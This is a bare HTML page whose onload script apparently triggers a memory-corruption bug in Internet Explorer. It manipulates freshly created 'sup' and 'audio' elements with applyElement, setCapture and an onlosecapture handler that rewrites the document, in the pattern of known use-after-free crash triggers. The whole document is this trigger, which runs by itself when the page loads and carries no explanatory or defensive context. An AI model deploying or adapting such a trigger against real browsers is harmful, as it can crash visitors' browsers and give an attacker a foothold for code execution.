<html>
	<meta http-equiv="cache-control" content="max-age=0" />
	<meta http-equiv="cache-control" content="no-cache" />
	<meta http-equiv="expires" content="0" />
	<meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT" />
	<meta http-equiv="pragma" content="no-cache" />
	<script>
		function trigger() {
			id0 = document.createElement("sup");
			id1 = document.createElement("audio");

			document.body.appendChild(id0);
			document.body.appendChild(id1);

			id1.applyElement(id0);

			id0.onlosecapture = function(e) {
				document.write("");
			}

			id0['outerText'] = "";
			id0.setCapture();
			id1.setCapture();
		}

		window.onload = function() { trigger(); }
	</script>
</html>
